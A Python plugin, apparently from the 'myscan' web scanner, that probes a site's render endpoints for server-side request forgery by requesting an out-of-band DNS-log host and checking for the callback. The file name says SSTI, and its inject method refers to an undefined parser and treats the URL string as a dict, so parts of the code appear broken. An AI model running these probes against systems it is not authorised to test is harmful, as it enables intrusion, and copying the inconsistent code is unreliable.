#!/usr/bin/env python3
# @Time    : 2020-12-03
# @Author  : jinqi
# @File    : myscan_ssti.py

'''
https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/
动态渲染导致ssrf漏洞
'''
from myscan.lib.core.data import others, cmd_line_options
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.threads import mythread
from myscan.lib.helper import dnslog
import requests


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "ssrf "
        self.vulmsg = "动态渲染导致ssrf漏洞"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.found_flag = []

    def verify(self):
        if self.dictdata.get("url").count("/") != 3:
            return
        try:
            host = dnslog.getdomain()
            requests.get(self.dictdata.get("url") + "render/http://" + host, timeout=3)
            if dnslog.getrecords():
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url") + "render/http://" + host,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "plugin": "动态渲染导致ssrf",
                        "param": "",
                        "payload": self.dictdata.get("url") + "render/http://" + host,
                    }
                })
            host = dnslog.getdomain()
            requests.get(self.dictdata.get("url") + "render?url=http://" + host, timeout=3)
            if dnslog.getrecords():
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url") + "render?url=http://" + host,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "plugin": "动态渲染导致ssrf",
                        "param": "",
                        "payload": self.dictdata.get("url") + "render?url=http://" + host,
                    }
                })
        except Exception as e:
            pass

    def inject(self, data):
        param, test_payload = data
        payload, show, plugin = test_payload
        # 是php后缀，但是plugin不是php框架，不测试
        if self.dictdata.get("url").get("extension")[:3].lower() in ["", "php"]:
            if plugin.lower() not in ["php", "smarty", "twig"]:
                return

        flag = "{name}---{type}".format(**param)
        if flag in self.found_flag:
            # 此参数已经有结果了，不用测试
            return
        req = self.parser.getreqfromparam(param, "w", payload)
        r = request(**req)
        if r != None and show.encode() in r.content:
            parser_ = response_parser(r)
            self.found_flag.append(flag)
            self.result.append({
                "name": self.name,
                "url": parser_.geturl(),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "plugin": plugin,
                    "param": param.get("name"),
                    "payload": payload,
                    "should_show": show,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
